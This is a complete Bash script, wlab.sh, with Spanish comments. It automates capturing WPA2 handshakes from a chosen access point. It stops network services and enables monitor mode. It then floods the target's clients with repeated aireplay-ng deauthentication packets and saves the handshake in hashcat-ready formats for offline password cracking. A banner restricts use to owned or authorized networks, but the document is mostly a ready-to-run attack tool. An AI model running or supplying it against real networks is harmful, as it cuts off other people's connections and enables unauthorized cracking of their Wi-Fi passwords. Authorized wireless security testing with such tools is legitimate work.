#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  wlab.sh  v4.4  ·  WPA2 Handshake Capture                                  ║
# ║  Uso:  sudo ./wlab.sh -i <iface> -t <BSSID|SSID> [-c <canal>] [-o <dir>]   ║
# ║  Deps: aircrack-ng iw wireless-tools wpaclean iwd                           ║
# ║  SOLO PARA REDES PROPIAS O AUTORIZADAS — USO EDUCATIVO / LAB                ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

# ── CRÍTICO: forzar bash aunque se invoque desde zsh ──────────────────────────
# zsh suspende procesos en background que escriben a tty → airodump no captura.
if [ -z "$BASH_VERSION" ]; then
    exec bash "$0" "$@"
fi

set -Eeuo pipefail

# ══════════════════════════════════════════════════════════════════════════════
#  CONSTANTES
# ══════════════════════════════════════════════════════════════════════════════
readonly VER="4.4"
readonly SCAN_SEC=15
readonly CAP_SEC=30
readonly DEAUTH_N=15
readonly DEAUTH_ROUNDS=3
readonly META_MAX_AGE=1800
readonly META_DIR="${HOME}/wssids"
readonly TMP=$(mktemp -d /tmp/wlab.XXXXXX)
MAX_TRIES=3

# ══════════════════════════════════════════════════════════════════════════════
#  COLORES Y LOGGING VERBOSE
# ══════════════════════════════════════════════════════════════════════════════
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; B='\033[1m';    N='\033[0m'; DIM='\033[2m'

ts()   { date '+%H:%M:%S'; }
info() { echo -e "${C}[·]${N} $(ts) $*"; }
ok()   { echo -e "${G}[✔]${N} $(ts) $*"; }
warn() { echo -e "${Y}[!]${N} $(ts) $*"; }
hdr()  { echo -e "\n${B}${C}── $* ──${N}"; }
sep()  { echo -e "${DIM}$(printf '─%.0s' {1..76})${N}"; }
die()  { echo -e "\n${R}[✘] $(ts) $*${N}" >&2; exit 1; }
dbg()  { echo -e "${DIM}    [dbg] $(ts) $*${N}"; }

# ══════════════════════════════════════════════════════════════════════════════
#  ESTADO
# ══════════════════════════════════════════════════════════════════════════════
IFACE="" TARGET="" SSID_NAME="" CHANNEL="" OUTDIR="$(pwd)"
MON="" CAP_FILE="" IWD_WAS_UP=0 IWD_NET="" META_FILE="" META_LOADED=0

# ══════════════════════════════════════════════════════════════════════════════
#  CLEANUP
# ══════════════════════════════════════════════════════════════════════════════
cleanup() {
    local rc=$?
    echo ""
    warn "Ejecutando cleanup..."
    pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null || true
    sleep 1

    if [[ -n "$MON" ]]; then
        dbg "Deteniendo monitor: $MON"
        airmon-ng stop "$MON" 2>&1 | while IFS= read -r l; do dbg "  $l"; done || true
    fi

    if [[ $IWD_WAS_UP -eq 1 ]]; then
        info "Restaurando iwd..."
        systemctl unmask iwd 2>/dev/null || true
        systemctl enable iwd 2>/dev/null || true
        systemctl start  iwd 2>/dev/null || true
        sleep 3
        if [[ -n "$IWD_NET" ]]; then
            info "Reconectando a '${IWD_NET}'..."
            local w=0
            until iwctl station "$IFACE" show &>/dev/null || (( w >= 15 )); do
                printf "\r  Esperando iwd... %ds" "$w"; sleep 1; w=$(( w+1 ))
            done
            echo ""
            iwctl station "$IFACE" connect "$IWD_NET" 2>/dev/null || true
            sleep 5
            if iwctl station "$IFACE" show 2>/dev/null | grep -qi "connected"; then
                ok "Reconectado a '${IWD_NET}'."
            else
                warn "Reconexión falló. Ejecuta: sudo iwctl station ${IFACE} connect '${IWD_NET}'"
            fi
        fi
    fi

    rm -rf "$TMP"
    [[ $rc -eq 0 ]] && ok "Finalizado OK (rc=0)." || warn "Finalizado con errores (rc=${rc})."
}
trap cleanup EXIT
trap 'warn "Señal INT/TERM."; exit 130' INT TERM

# ══════════════════════════════════════════════════════════════════════════════
#  AYUDA
# ══════════════════════════════════════════════════════════════════════════════
usage() {
    echo -e "${B}wlab.sh v${VER}${N} — WPA2 Lab Tool (solo redes autorizadas)"
    echo -e "  sudo $0 -i <iface> -t <BSSID|SSID> [-c <canal>] [-o <dir>]\n"
    echo "  -i  Interfaz física  (ej: wlan0)"
    echo "  -t  BSSID o SSID     (red propia/autorizada)"
    echo "  -c  Canal            (opcional — se autodetecta)"
    echo "  -o  Directorio salida (por defecto: pwd)"
    echo "  -h  Esta ayuda"
    exit 0
}

# ══════════════════════════════════════════════════════════════════════════════
#  ARGUMENTOS
# ══════════════════════════════════════════════════════════════════════════════
parse_args() {
    [[ $# -eq 0 ]] && usage
    while getopts ":i:t:c:o:h" opt; do
        case $opt in
            i) IFACE="$OPTARG"   ;; t) TARGET="$OPTARG"  ;;
            c) CHANNEL="$OPTARG" ;; o) OUTDIR="$OPTARG"  ;;
            h) usage ;;
            :) die "La opción -${OPTARG} requiere argumento." ;;
            *) die "Opción desconocida: -${OPTARG}  (usa -h)" ;;
        esac
    done
    [[ -z "$IFACE"  ]] && die "Falta -i <interfaz>."
    [[ -z "$TARGET" ]] && die "Falta -t <BSSID|SSID>."
    [[ -n "$CHANNEL" && ! "$CHANNEL" =~ ^[0-9]+$ ]] && die "Canal debe ser número entero."
    mkdir -p "$OUTDIR" || die "No se pudo crear OUTDIR: ${OUTDIR}"
    dbg "Args: IFACE=${IFACE} TARGET=${TARGET} CHANNEL=${CHANNEL:-auto} OUTDIR=${OUTDIR}"
}

# ══════════════════════════════════════════════════════════════════════════════
#  METADATOS
# ══════════════════════════════════════════════════════════════════════════════
sanitize_name() {
    echo "$1" | tr '[:upper:]' '[:lower:]' \
        | tr -cs 'a-z0-9._-' '_' \
        | sed 's/_\+/_/g; s/^_//; s/_$//'
}

init_meta() {
    if [[ ! -d "$META_DIR" ]]; then
        mkdir -p "$META_DIR" || die "No se pudo crear META_DIR: ${META_DIR}"
        chmod 700 "$META_DIR" 2>/dev/null || true
        ok "Directorio de metadatos creado: ${META_DIR}"
    else
        dbg "META_DIR existe: ${META_DIR}"
    fi
    META_FILE="${META_DIR}/$(sanitize_name "$TARGET").meta"
    dbg "META_FILE provisional: ${META_FILE}"
}

update_meta_name() {
    [[ -z "$SSID_NAME" ]] && return 0
    local new="${META_DIR}/$(sanitize_name "$SSID_NAME").meta"
    if [[ "$new" != "$META_FILE" && -f "$META_FILE" ]]; then
        mv -f "$META_FILE" "$new" 2>/dev/null || true
        dbg "META_FILE renombrado → ${new}"
    fi
    META_FILE="$new"
}

write_meta() {
    [[ -z "$META_FILE" ]] && return 0
    mkdir -p "$META_DIR" 2>/dev/null || true
    cat > "$META_FILE" <<EOF
# wlab.sh v${VER} — Caché de metadatos. No editar manualmente.
WLAB_VERSION=${VER}
TIMESTAMP=$(date '+%s')
DATETIME=$(date '+%Y-%m-%d %H:%M:%S')
SSID=${SSID_NAME}
BSSID=${TARGET}
CHANNEL=${CHANNEL}
IFACE=${IFACE}
OUTDIR=${OUTDIR}
IWD_WAS_UP=${IWD_WAS_UP}
IWD_NET=${IWD_NET}
HOSTNAME=$(hostname 2>/dev/null || echo unknown)
KERNEL=$(uname -r   2>/dev/null || echo unknown)
EOF
    chmod 600 "$META_FILE" 2>/dev/null || true
    ok "Metadatos guardados → ${META_FILE}"
}

load_meta() {
    [[ -z "$META_FILE" || ! -f "$META_FILE" ]] && { dbg "Sin META_FILE o no existe."; return 1; }

    local ts bssid channel ssid_stored
    ts=$(         grep '^TIMESTAMP=' "$META_FILE" | cut -d'=' -f2- | tr -d '[:space:]') || { rm -f "$META_FILE"; return 1; }
    bssid=$(      grep '^BSSID='     "$META_FILE" | cut -d'=' -f2- | tr -d '[:space:]') || { rm -f "$META_FILE"; return 1; }
    channel=$(    grep '^CHANNEL='   "$META_FILE" | cut -d'=' -f2- | tr -d '[:space:]') || { rm -f "$META_FILE"; return 1; }
    ssid_stored=$(grep '^SSID='      "$META_FILE" | cut -d'=' -f2-)                     || { rm -f "$META_FILE"; return 1; }

    if [[ -z "$ts" || -z "$bssid" || -z "$channel" ]]; then
        warn "Caché corrupta (campos vacíos) — descartando."; rm -f "$META_FILE"; return 1; fi
    if [[ ! "$ts"      =~ ^[0-9]+$ ]]; then
        warn "Caché corrupta (timestamp) — descartando.";     rm -f "$META_FILE"; return 1; fi
    if [[ ! "$bssid"   =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        warn "Caché corrupta (BSSID) — descartando.";         rm -f "$META_FILE"; return 1; fi
    if [[ ! "$channel" =~ ^[0-9]+$ ]]; then
        warn "Caché corrupta (canal) — descartando.";         rm -f "$META_FILE"; return 1; fi

    local now age mins secs
    now=$(date '+%s'); age=$(( now - ts ))
    mins=$(( age / 60 )); secs=$(( age % 60 ))

    TARGET="$bssid"; CHANNEL="$channel"; SSID_NAME="${ssid_stored}"
    update_meta_name

    if (( age > META_MAX_AGE )); then
        warn "Caché de '${ssid_stored}' expirada (${mins}m ${secs}s)."
        META_LOADED=2
    else
        ok "Caché válida '${ssid_stored}' (${mins}m ${secs}s) — escaneo omitido."
        META_LOADED=1
    fi
    return 0
}

# ══════════════════════════════════════════════════════════════════════════════
#  PRE-FLIGHT
# ══════════════════════════════════════════════════════════════════════════════
preflight() {
    hdr "Pre-flight"
    [[ $(id -u) -eq 0 ]] || die "Requiere root: sudo $0"
    ok "Root: OK"

    local miss=()
    for dep in airmon-ng airodump-ng aireplay-ng aircrack-ng wpaclean iwctl; do
        if command -v "$dep" &>/dev/null; then
            dbg "  dep OK: $dep → $(command -v "$dep")"
        else
            miss+=("$dep")
        fi
    done
    (( ${#miss[@]} > 0 )) \
        && die "Dependencias faltantes: ${miss[*]}\n  → sudo apt install aircrack-ng iwd"
    ok "Dependencias obligatorias: OK"

    for opt in cap2hccapx hcxpcapngtool tshark; do
        command -v "$opt" &>/dev/null \
            && dbg "  opcional OK: $opt" \
            || warn "Opcional no encontrado: $opt"
    done

    dbg "Shell: ${BASH}  versión: ${BASH_VERSION}"
    dbg "Sistema: $(uname -a)"
    sep
}

# ══════════════════════════════════════════════════════════════════════════════
#  IWD
# ══════════════════════════════════════════════════════════════════════════════
save_and_stop_iwd() {
    hdr "Gestión iwd"
    if systemctl is-active --quiet iwd 2>/dev/null; then
        IWD_WAS_UP=1
        IWD_NET=$(iwctl station "$IFACE" show 2>/dev/null \
            | awk '/Connected network/ {print $NF}' | tr -d '[:space:]') || true
        [[ -n "$IWD_NET" ]] \
            && ok "Red guardada: '${IWD_NET}'" \
            || warn "iwd activo sin red conectada."

        systemctl stop iwd 2>&1 | while IFS= read -r l; do dbg "  stop: $l"; done || true
        systemctl mask iwd 2>&1 | while IFS= read -r l; do dbg "  mask: $l"; done || true
        pkill -9 iwd    2>/dev/null || true
        pkill -9 dhcpcd 2>/dev/null || true
        sleep 2
        ok "iwd detenido y enmascarado."
    else
        warn "iwd no estaba activo."
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
#  MONITOR MODE
# ══════════════════════════════════════════════════════════════════════════════
start_monitor() {
    hdr "Monitor Mode"

    info "Matando dhcpcd / wpa_supplicant..."
    pkill -x dhcpcd         2>/dev/null && dbg "dhcpcd terminado."         || dbg "dhcpcd no corría."
    pkill -x wpa_supplicant 2>/dev/null && dbg "wpa_supplicant terminado." || dbg "wpa_supplicant no corría."
    sleep 1

    info "airmon-ng check kill..."
    airmon-ng check kill 2>&1 | while IFS= read -r l; do dbg "  $l"; done || true
    sleep 1
    pkill -9 iwd    2>/dev/null || true
    pkill -9 dhcpcd 2>/dev/null || true
    sleep 1

    info "Iniciando modo monitor en '${IFACE}'..."
    local airmon_out
    airmon_out=$(echo "y" | airmon-ng start "$IFACE" 2>&1) || true
    echo "$airmon_out" | while IFS= read -r l; do dbg "  airmon: $l"; done

    MON=$(echo "$airmon_out" \
        | sed -n 's/.*\]\(wlan[0-9]*mon\).*/\1/p' \
        | head -1)

    if [[ -z "$MON" ]]; then
        MON=$(iw dev 2>/dev/null \
            | awk '/Interface/{i=$2} /type monitor/{print i}' \
            | head -1)
        dbg "MON por fallback iw dev: '${MON}'"
    else
        dbg "MON desde airmon output: '${MON}'"
    fi

    [[ -z "$MON" ]] \
        && die "No se creó interfaz monitor.\n  Salida airmon-ng:\n${airmon_out}\n  Verifica: sudo iw dev"

    # Asegurar UP
    ip link set "$MON" up 2>/dev/null && dbg "${MON} levantado (ip link set up)." || true
    sleep 1

    dbg "Estado final de ${MON}:"
    iw dev "$MON" info 2>/dev/null | while IFS= read -r l; do dbg "  $l"; done || true

    ok "Interfaz monitor activa: ${MON}"
}

# ══════════════════════════════════════════════════════════════════════════════
#  ESCANEO
# ══════════════════════════════════════════════════════════════════════════════
run_scan() {
    rm -f "${TMP}/scan-01.csv" 2>/dev/null || true
    info "Escaneo de redes (${SCAN_SEC}s) → log: ${TMP}/scan.log"

    # CRÍTICO: redirigir a archivo — evita suspend en zsh y permite captura real
    airodump-ng \
        --output-format csv \
        --write "${TMP}/scan" \
        "$MON" > "${TMP}/scan.log" 2>&1 &
    local scan_pid=$!
    dbg "airodump-ng escaneo PID: ${scan_pid}"

    local i=0
    while kill -0 "$scan_pid" 2>/dev/null && (( i < SCAN_SEC )); do
        printf "\r  ${C}Escaneando... %2ds${N}" "$(( SCAN_SEC - i ))"
        sleep 1; i=$(( i+1 ))
    done
    printf "\r  ${C}Escaneo completado.     ${N}\n"

    kill "$scan_pid" 2>/dev/null || true
    wait "$scan_pid" 2>/dev/null || true

    if [[ ! -f "${TMP}/scan-01.csv" ]]; then
        warn "Log airodump-ng (escaneo):"
        cat "${TMP}/scan.log" 2>/dev/null | while IFS= read -r l; do warn "  $l"; done
        die "Sin CSV tras escaneo. ¿${MON} en monitor mode y UP?"
    fi

    local ap_count
    ap_count=$(grep -c '^[0-9A-Fa-f]\{2\}:' "${TMP}/scan-01.csv" 2>/dev/null || echo 0)
    dbg "MACs en CSV: ${ap_count}"

    if [[ "$ap_count" -eq 0 ]]; then
        warn "CSV vacío. Log airodump-ng:"
        cat "${TMP}/scan.log" 2>/dev/null | while IFS= read -r l; do warn "  $l"; done
        die "Escaneo sin resultados. ¿Interfaz en monitor mode?"
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
#  RESOLVER OBJETIVO
# ══════════════════════════════════════════════════════════════════════════════
resolve_target() {
    hdr "Resolución de objetivo"

    local is_bssid=0
    [[ "$TARGET" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && is_bssid=1
    dbg "TARGET='${TARGET}'  is_bssid=${is_bssid}  META_LOADED=${META_LOADED}  CHANNEL='${CHANNEL}'"

    if (( META_LOADED >= 1 )) && [[ -n "$CHANNEL" ]]; then
        TARGET="${TARGET^^}"
        local src="caché fresca"; (( META_LOADED == 2 )) && src="caché expirada"
        ok "BSSID=${TARGET}  Canal=${CHANNEL}  SSID='${SSID_NAME}'  (${src})"
        return 0
    fi

    if (( is_bssid )) && [[ -n "$CHANNEL" ]]; then
        TARGET="${TARGET^^}"
        [[ -z "$SSID_NAME" ]] && SSID_NAME="$TARGET"
        ok "BSSID=${TARGET}  Canal=${CHANNEL}  (args directos)"
        update_meta_name; write_meta; return 0
    fi

    run_scan
    local csv="${TMP}/scan-01.csv"

    if (( is_bssid )); then
        CHANNEL=$(awk -F',' -v b="${TARGET^^}" '
            /^[0-9A-Fa-f]{2}:/ { gsub(/ /,"",$1); gsub(/ /,"",$4)
                if (toupper($1)==b) { print $4; exit } }' "$csv")
        [[ -z "$CHANNEL" ]] \
            && die "Canal no encontrado para ${TARGET}. Usa -c <canal>."
        local ssid_found
        ssid_found=$(awk -F',' -v b="${TARGET^^}" '
            /^[0-9A-Fa-f]{2}:/ { for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                if (toupper($1)==b && $14!="") { print $14; exit } }' "$csv") || true
        SSID_NAME="${ssid_found:-$TARGET}"
    else
        dbg "Buscando SSID '${TARGET}' en CSV..."
        local row
        row=$(awk -F',' -v s="$TARGET" '
            /^[0-9A-Fa-f]{2}:/ { for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                if ($14==s && $6~/WPA/) { print $1"|"$4; exit } }' "$csv") || true

        if [[ -z "$row" ]]; then
            warn "SSID '${TARGET}' no encontrado. Redes detectadas:"
            awk -F',' '/^[0-9A-Fa-f]{2}:/{
                for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                if($14!="" && $14!="ESSID")
                    printf "  BSSID=%-20s  Ch=%-3s  Enc=%-10s  SSID=%s\n",$1,$4,$6,$14
            }' "$csv" | head -20
            die "SSID '${TARGET}' no encontrado en el escaneo."
        fi

        SSID_NAME="$TARGET"
        TARGET=$(cut -d'|' -f1 <<< "$row")
        CHANNEL=${CHANNEL:-$(cut -d'|' -f2 <<< "$row")}
        dbg "Resuelto: BSSID=${TARGET}  CHANNEL=${CHANNEL}"
    fi

    TARGET="${TARGET^^}"
    update_meta_name
    ok "BSSID=${TARGET}  Canal=${CHANNEL}  SSID='${SSID_NAME}'"
    write_meta
}

# ══════════════════════════════════════════════════════════════════════════════
#  DETECTAR CLIENTES
# ══════════════════════════════════════════════════════════════════════════════
detect_clients() {
    local csv="${TMP}/scan-01.csv"

    if [[ ! -f "$csv" ]]; then
        dbg "Sin CSV previo — escaneo corto de 8s..."
        airodump-ng \
            --bssid "$TARGET" --channel "$CHANNEL" \
            --output-format csv \
            --write "${TMP}/scan" \
            "$MON" > "${TMP}/scan_clients.log" 2>&1 &
        local p=$!
        sleep 8; kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true
    fi

    local n=0
    if [[ -f "$csv" ]]; then
        dbg "Clientes en CSV para AP ${TARGET}:"
        awk -F',' -v ap="${TARGET^^}" '
            /^$/ { past=1 }
            past && /^[0-9A-Fa-f]{2}:/ {
                for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                if (toupper($6)==ap)
                    printf "    MAC=%-20s  AP=%-20s  Power=%s\n",$1,$6,$4
            }' "$csv" 2>/dev/null | while IFS= read -r l; do dbg "$l"; done

        n=$(awk -F',' -v ap="${TARGET^^}" '
            /^$/ { past=1 }
            past && /^[0-9A-Fa-f]{2}:/ {
                for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                if (toupper($6)==ap) count++
            }
            END { print count+0 }' "$csv" 2>/dev/null) || n=0
    else
        warn "Sin CSV para detectar clientes."
    fi

    echo "$n"
}

# ══════════════════════════════════════════════════════════════════════════════
#  CAPTURA (un ciclo)
# ══════════════════════════════════════════════════════════════════════════════
capture_once() {
    local clients
    clients=$(detect_clients)
    info "Clientes detectados en '${SSID_NAME}': ${clients}"

    if (( clients == 0 )); then
        warn "Sin clientes visibles — se intentará de todas formas."
        warn "Sin clientes activos el handshake es muy difícil de capturar."
    else
        ok "${clients} cliente(s) — buenas condiciones para captura."
    fi

    local base="${TMP}/cap" attempt=1

    while (( attempt <= MAX_TRIES )); do
        hdr "Intento ${attempt}/${MAX_TRIES}"
        info "BSSID=${TARGET}  Canal=${CHANNEL}  Duración=${CAP_SEC}s"
        rm -f "${base}"-*.cap 2>/dev/null || true

        local cap_log="${TMP}/cap_attempt${attempt}.log"
        info "Iniciando airodump-ng → ${cap_log}"

        # CRÍTICO: redirigir stdout+stderr a archivo
        # Sin esto, en zsh el proceso se suspende y no captura nada
        airodump-ng \
            --bssid   "$TARGET"  \
            --channel "$CHANNEL" \
            --output-format pcap \
            --write   "$base"    \
            "$MON" > "$cap_log" 2>&1 &
        local adump=$!
        dbg "airodump-ng PID: ${adump}"
        sleep 2

        if ! kill -0 "$adump" 2>/dev/null; then
            warn "airodump-ng murió al iniciar. Log:"
            cat "$cap_log" | while IFS= read -r l; do warn "  $l"; done
            attempt=$(( attempt+1 )); continue
        fi
        ok "airodump-ng corriendo (PID ${adump})."

        local deauth_log="${TMP}/deauth_attempt${attempt}.log"
        info "Iniciando deauth (${DEAUTH_N} pkts x ${DEAUTH_ROUNDS} rondas)..."
        (
            for r in $(seq 1 $DEAUTH_ROUNDS); do
                dbg "Deauth ronda ${r}/${DEAUTH_ROUNDS}"
                aireplay-ng --deauth "$DEAUTH_N" -a "$TARGET" "$MON" \
                    >> "$deauth_log" 2>&1 || true
                sleep 3
            done
        ) &
        local deauth_pid=$!
        dbg "deauth PID: ${deauth_pid}"

        local i=0
        while (( i < CAP_SEC )); do
            if ! kill -0 "$adump" 2>/dev/null; then
                echo ""
                warn "airodump-ng murió durante captura. Log:"
                cat "$cap_log" | while IFS= read -r l; do warn "  $l"; done
                break
            fi
            printf "\r  ${C}Capturando %2ds | airodump PID=${adump} | deauth PID=${deauth_pid}${N}" \
                "$(( CAP_SEC - i ))"
            sleep 1; i=$(( i+1 ))
        done
        echo ""

        kill "$deauth_pid" 2>/dev/null || true; wait "$deauth_pid" 2>/dev/null || true
        kill "$adump"      2>/dev/null || true; wait "$adump"      2>/dev/null || true
        sleep 1

        dbg "Log deauth intento ${attempt}:"
        cat "$deauth_log" 2>/dev/null | while IFS= read -r l; do dbg "  $l"; done || true

        local cf="${base}-01.cap"
        if [[ ! -f "$cf" ]]; then
            warn ".cap no generado: ${cf}"
            warn "Log airodump intento ${attempt}:"
            cat "$cap_log" | while IFS= read -r l; do warn "  $l"; done
            attempt=$(( attempt+1 )); continue
        fi

        local frame_info
        frame_info=$(aircrack-ng "$cf" 2>/dev/null | grep -oE '[0-9]+ handshake' | head -1) || true
        dbg "aircrack-ng dice: '${frame_info:-sin handshake}'"

        if command -v tshark &>/dev/null; then
            local eapol_count
            eapol_count=$(tshark -r "$cf" -Y "eapol" 2>/dev/null | wc -l) || eapol_count=0
            info "Frames EAPOL en .cap: ${eapol_count}/4 necesarios para handshake completo"
            if (( eapol_count > 0 && eapol_count < 4 )); then
                warn "Handshake incompleto (${eapol_count}/4). El deauth puede no haber llegado al cliente."
            fi
        fi

        if [[ -n "$frame_info" ]]; then
            ok "¡Handshake! (${frame_info}) — intento ${attempt}"
            CAP_FILE="$cf"; return 0
        fi

        warn "Sin handshake en intento ${attempt}."
        if (( attempt < MAX_TRIES )); then
            local w=$(( attempt * 5 ))
            info "Esperando ${w}s..."; sleep "$w"
        fi
        attempt=$(( attempt+1 ))
    done

    return 1
}

# ══════════════════════════════════════════════════════════════════════════════
#  CAPTURA CON LÓGICA DE CACHÉ
# ══════════════════════════════════════════════════════════════════════════════
capture() {
    hdr "Captura de handshake"
    capture_once && { write_meta; return 0; }

    if (( META_LOADED == 2 )); then
        warn "Fallo con caché expirada — re-escaneando para verificar datos..."
        local old_target="$TARGET" old_channel="$CHANNEL"
        META_LOADED=0; rm -f "$META_FILE" 2>/dev/null || true

        run_scan
        local csv="${TMP}/scan-01.csv" new_bssid new_channel row

        if [[ "$old_target" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            new_channel=$(awk -F',' -v b="${old_target^^}" '
                /^[0-9A-Fa-f]{2}:/ { gsub(/ /,"",$1); gsub(/ /,"",$4)
                    if (toupper($1)==b) { print $4; exit } }' "$csv") || true
            new_bssid="$old_target"
        else
            row=$(awk -F',' -v s="$SSID_NAME" '
                /^[0-9A-Fa-f]{2}:/ { for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                    if ($14==s && $6~/WPA/) { print $1"|"$4; exit } }' "$csv") || true
            new_bssid=$(cut -d'|' -f1 <<< "$row" 2>/dev/null) || true
            new_channel=$(cut -d'|' -f2 <<< "$row" 2>/dev/null) || true
        fi

        [[ -z "$new_bssid" || -z "$new_channel" ]] \
            && die "Re-escaneo sin resultados para '${SSID_NAME}'. ¿AP encendido?"

        new_bssid="${new_bssid^^}"
        dbg "Comparando: old=${old_target}/${old_channel}  new=${new_bssid}/${new_channel}"

        if [[ "$new_bssid" != "$old_target" || "$new_channel" != "$old_channel" ]]; then
            warn "Datos actualizados: BSSID ${old_target}→${new_bssid}  Canal ${old_channel}→${new_channel}"
            TARGET="$new_bssid"; CHANNEL="$new_channel"
            write_meta; MAX_TRIES=3
            capture_once && { write_meta; return 0; } \
                || die "Sin handshake tras reintento con datos renovados."
        else
            write_meta
            die "Sin handshake. Datos verificados correctos.\n  Causas: sin clientes activos, señal débil, MFP activo."
        fi

    elif (( META_LOADED == 1 )); then
        die "Sin handshake. Caché fresca — datos OK.\n  Causas: sin clientes activos, señal débil, MFP activo."
    else
        die "Sin handshake tras ${MAX_TRIES} intentos.\n  Causas: sin clientes activos, señal débil, AP fuera de rango."
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
#  GUARDAR Y CONVERTIR
# ══════════════════════════════════════════════════════════════════════════════
optimize() {
    hdr "Guardando capturas"
    local safe="${TARGET//:/-}"
    local base="${OUTDIR}/${safe}"
    local clean="${TMP}/${safe}_clean.cap"

    info "wpaclean → ${clean}"
    if wpaclean "$clean" "$CAP_FILE" 2>&1 \
        | while IFS= read -r l; do dbg "  wpaclean: $l"; done \
        && [[ -s "$clean" ]]; then
        ok "wpaclean OK ($(du -sh "$clean" | cut -f1))"
    else
        warn "wpaclean falló — usando .cap original."
        cp "$CAP_FILE" "$clean"
    fi

    local saved=0
    if command -v cap2hccapx &>/dev/null; then
        cap2hccapx "$clean" "${base}.hccapx" 2>&1 \
            | while IFS= read -r l; do dbg "  cap2hccapx: $l"; done \
            && ok "→ ${base}.hccapx" && saved=$(( saved+1 )) \
            || warn "cap2hccapx falló."
    fi
    if command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool -o "${base}.22000" "$clean" 2>&1 \
            | while IFS= read -r l; do dbg "  hcxpcapngtool: $l"; done \
            && ok "→ ${base}.22000" && saved=$(( saved+1 )) \
            || warn "hcxpcapngtool falló."
    fi
    (( saved == 0 )) && { cp "$clean" "${base}.cap" && ok "→ ${base}.cap"; }

    printf "# wlab v%s  %s\nSSID=%s\nBSSID=%s\nChannel=%s\nIface=%s\n" \
        "$VER" "$(date '+%Y-%m-%d %H:%M:%S')" \
        "$SSID_NAME" "$TARGET" "$CHANNEL" "$IFACE" \
        > "${base}.info"
    ok "→ ${base}.info"
    sep
}

# ══════════════════════════════════════════════════════════════════════════════
#  RESUMEN
# ══════════════════════════════════════════════════════════════════════════════
summary() {
    hdr "Archivos generados"
    find "$OUTDIR" -maxdepth 1 -name "${TARGET//:/-}*" | sort | while IFS= read -r f; do
        echo -e "  ${G}✔${N}  $(basename "$f")  ($(du -sh "$f" | cut -f1))"
    done
    echo ""
    info "Caché de red : ${META_FILE}"
    info "Todas las redes: ls ${META_DIR}/"
    echo ""
}

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
echo -e "\n${B}${C}  wlab.sh v${VER} — WPA2 Lab Tool${N}  ·  solo redes autorizadas"
echo -e "${DIM}  Shell: ${BASH}  PID: $$${N}\n"

parse_args "$@"
init_meta

hdr "Caché de red"
if load_meta; then
    (( META_LOADED == 1 )) \
        && ok  "Datos frescos — escaneo omitido." \
        || warn "Caché expirada — se usará con verificación ante fallos."
else
    info "Sin caché para '${TARGET}' — escaneo completo."
fi

preflight
save_and_stop_iwd
start_monitor
resolve_target
capture
optimize
summary

